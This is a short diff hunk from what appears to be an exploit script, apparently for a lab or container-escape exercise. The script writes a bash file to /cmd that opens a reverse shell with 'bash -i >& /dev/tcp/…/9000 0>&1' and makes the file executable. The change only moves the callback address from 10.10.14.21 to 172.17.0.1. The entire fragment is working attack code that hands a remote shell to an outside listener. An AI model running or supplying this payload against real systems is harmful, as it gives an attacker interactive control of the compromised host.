@@ -104,7 +104,7 @@ chmod a+x /cmd
 #===================================
 #Reverse shell
 echo '#!/bin/bash' > /cmd
-echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
+echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
 chmod a+x /cmd
 #===================================
 
